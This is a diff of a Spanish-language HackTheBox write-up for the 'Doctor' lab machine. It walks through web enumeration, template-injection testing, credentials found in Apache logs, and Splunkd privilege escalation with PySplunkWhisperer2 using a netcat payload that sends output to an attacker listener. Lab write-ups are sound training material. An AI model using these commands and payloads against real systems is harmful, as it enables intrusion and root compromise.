@@ -1,9 +1,11 @@
-10.10.10.209
-------------
-1. Enumeracion
+10.10.10.209 - Doctor
+
+![Doctor](https://user-images.githubusercontent.com/96772264/200542469-192afc61-3221-4abf-b5e4-3764ec5df541.png)
+
+---------------------
+## Part 1: Enumeracion
 
 Puertos abiertos (script de bash): 22(ssh), 80(http), 8089(http)
-
 El escaneo de nmap reporta lo siguiente:
 ```console
 └─$ nmap -T5 10.10.10.209 -p22,80,8089 -sCV
@@ -24,11 +26,12 @@ ERROR Opening: http://10.10.10.209:8089 - Connection reset by peer
 └─$ whatweb https://doctors.htb:8089   # Por https si
 https://doctors.htb:8089 [200 OK] Country[RESERVED][ZZ], HTTPServer[Splunkd], IP[10.10.10.209], Title[splunkd], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]
 ```
-El email es info@doctors.htb, eso indica el titulo de la web al que poner en el etc/hosts,
+El email es info@doctors.htb, eso indica el titulo de la web al que poner en el etc/hosts.  
 
+![doctor1](https://user-images.githubusercontent.com/96772264/200542960-eb9db086-1d96-4e5b-ab00-378a56117ada.PNG)
 
 Enumeracion web:
-``console
+```console
 └─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.209/FUZZ
 000000536:   301        9 L      28 W       310 Ch      "css"                                                
 000000939:   301        9 L      28 W       309 Ch      "js"                                                 
@@ -36,7 +39,9 @@ Enumeracion web:
 000002757:   301        9 L      28 W       312 Ch      "fonts" 
 000095510:   403        9 L      28 W       277 Ch      "server-status"
 ```
-Nada interesante, vamos a ver el splunkd
+Nada interesante, vamos a ver el splunkd:
+
+![doctor2](https://user-images.githubusercontent.com/96772264/200543221-00bad634-f26c-402e-bd87-3c970086381b.PNG)
 
 ```console
 └─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://10.10.10.209:8089/FUZZ
@@ -50,24 +55,22 @@ Nada interesante, vamos a ver el splunkd
 000010676:   200        36 L     533 W      2178 Ch     "v7"                                                 
 000020954:   200        36 L     533 W      2178 Ch     "v10"
 ```
-Son todo rutas *vnumero* (suelen existir en las apis, ya investigare), todas devuelven 36 lineas asi que en 
-wfuu oculto respuestas de ese tamaño con el parametro ```--hl=36``` pero ahi no encuentro nada. Recuerdo que 
-habia un robots.txt en el nmap, existe pero no pone nada interesante.
+Son todo rutas *vnumero* (suelen existir en las apis, ya investigare), todas devuelven 36 lineas asi que en wfuzz oculto respuestas de ese tamaño con el parametro 
+```--hl=36``` pero ahi no encuentro nada. Recuerdo que habia un robots.txt en el nmap, existe pero no pone nada interesante.
 
-WEB puerto 80
---------------
+----------------------------------------
+## Part 2: STTI en la Web del puerto 80
 
 Las rutas de la pagina principal no conducen a nada, (no son funcionales), lo interesante que sacar es nombres
 "Dr. Jade Guzman", "Dr. Hannah Ford" y "Dr. James Wilson", que puede que sean usuarios del sistema.
-
 Si en vez de la ip pongo http://doctors.htb me sale una pagina complemtamente diferente:
 
-```http://doctors.htb/login?next=%2F```
+![doctor3](https://user-images.githubusercontent.com/96772264/200543675-8783420f-c498-494e-8ef0-93511f98e196.PNG)
 
 ```console
-http://doctors.htb/login?next=%2F [200 OK] Bootstrap[4.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/1.0.1 Python/3.8.2], IP[10.10.10.209], JQuery, PasswordField[password], Python[3.8.2], Script, Title[Doctor Secure Messaging - Login], Werkzeug[1.0.1]
+└─$ whatweb http://doctors.htb
+http://doctors.htb/login?next=%2F [200 OK] Bootstrap[4.0.0], HTTPServer[Werkzeug/1.0.1 Python/3.8.2], IP[10.10.10.209], JQuery, PasswordField[password], Python[3.8.2], Script, Title[Doctor Secure Messaging - Login], Werkzeug[1.0.1]
 ```
-
 ```console
 └─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://doctors.htb/FUZZ
 000000051:   200        100 L    238 W      4493 Ch     "register"
@@ -78,26 +81,21 @@ http://doctors.htb/login?next=%2F [200 OK] Bootstrap[4.0.0], Country[RESERVED][Z
 000001211:   302        3 L      24 W       217 Ch      "logout"
 ```
 
-Me he registrado con un nombre que incluye una comprobacion de STTI (si al ver el nombre pone cucuxii49 es 
-vulnerable) > usaurio "cucuxii{{9*9}}" mail "cucuxii{{9*9}}@mail.com", contraseña "cucuxii123" pero por ahora no.
+Me he registrado con un nombre que incluye una comprobacion de STTI (si al ver el nombre pone cucuxii49 es vulnerable) 
+```usaurio "cucuxii{{9*9}}" mail "cucuxii{{9*9}}@mail.com", contraseña "cucuxii123"``` pero por ahora no.
 La cuenta es temporal segun esto, 20 minutos. 
-Tengo una cookie de sesion > ".eJwljktqBDEMBe_idRbWz5LmMoMtySQEEuieWYXcfZqEWr1aPOqn3fdR53u7PY5nvbX7R7Zbm7I7SG615bRoW-nCRWuWCYQl18iYjJYOIuAEqhG5eHOhcg-AQKGBw9NEE9BqxB8StbsXI4ISh80c7DlkrujmNDuTQ7tCnmcd_zV4zTiPfX98f9bXJYYieteK4aTLsboFW10vqmTQoaTzImq_L9VKPeU.Y0fGCg.WNMwEmuC8pvT3TGVpBMmNQgIlAw"
+Tengo una cookie de sesion > ```".eJwljktqBDEMBe_idRbWz5LmMoMtySQEEuieWYXcfZqEWr1aPOqn3fdR53u7PY5nvbX7R7Zbm7I7SG615bRoW-nCRWuWCYQl18iYjJYOIuAEqhG5eHOhcg-AQKGBw9NEE9BqxB8StbsXI4ISh80c7DlkrujmNDuTQ7tCnmcd_zV4zTiPfX98f9bXJYYieteK4aTLsboFW10vqmTQoaTzImq_L9VKPeU.Y0fGCg.WNMwEmuC8pvT3TGVpBMmNQgIlAw"```
 
 La decodifique en base 64 pero no son mas que bytes inutiles.
-
 La web me deja escribir un mensaje, pongo otro STTI ({{9*9}}) pero tampoco.
-
 Arriba pone ```http://doctors.htb/home?page=1``` pero tras varios intentos no parece ser vulnerable a LFI.
 
-La ruta /archive parece no tener nada, pero si vemos el codigo fuente sale un xml
-```xml
-<?xml version="1.0" encoding="UTF-8" ?>
-<rss version="2.0">
-<channel>
-<title>Archive</title>
-<item><title>81</title></item>
-</channel>	
-```
+![doctor5](https://user-images.githubusercontent.com/96772264/200544480-8ef0f3dc-1a48-4359-9de5-dceb034ee93e.PNG)
+
+La ruta /archive parece no tener nada, pero si vemos el codigo fuente sale un xml:
+
+![doctor6](https://user-images.githubusercontent.com/96772264/200544699-12ba2cc8-773e-4be7-9002-5c01891aa05e.PNG)
+
 Ese 81 de ahi que es? Pued nada mas ni nada menos que el resultado del STTI de antes que pusimos en New Message
 ```{{9*9}}```
 
@@ -115,19 +113,19 @@ Reverse shell:
 web@doctor:~$ whoami
 web
 ```
-Tras una enumeracion sin encontrar capabilities ni nada del estilo di con que el usuario es del grupo adm
-asi que puede leer los logs.
+------------------------
+## Part 3: En el sistema
+
+Tras una enumeracion sin encontrar capabilities ni nada del estilo di con que el usuario es del grupo **adm** asi que puede leer los logs.
 ```console
 web@doctor:/home$ id
 uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
 web@doctor:/var/log$ grep -rIE "password" 2>/dev/null
 apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
 ```
-
-Con esas creds "shaun:Guitar123" te puedes conectar a la web dle puerto 8089. Como hay demasiadas rutas, puse
-pentesting splunkd en Hacktricks y acabe en esta [pagina](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/splunk-lpe-and-persistence)
-Ahi hablaban del script PySplunkWhisperer2 que me baje despues de guithub
-```
+Con esas creds "shaun:Guitar123" te puedes conectar a la web dle puerto 8089. Como hay demasiadas rutas, puse  **pentesting splunkd** en Hacktricks y acabe en esta [pagina](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/splunk-lpe-and-persistence)    
+Ahi hablaban del script PySplunkWhisperer2 que me baje despues de github:  
+```console
 └─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --user shaun --password Guitar123 --lhost 10.10.14.5  --payload "whoami | nc 10.10.14.5 444"
 └─$ sudo nc -nlvp 444 
 root
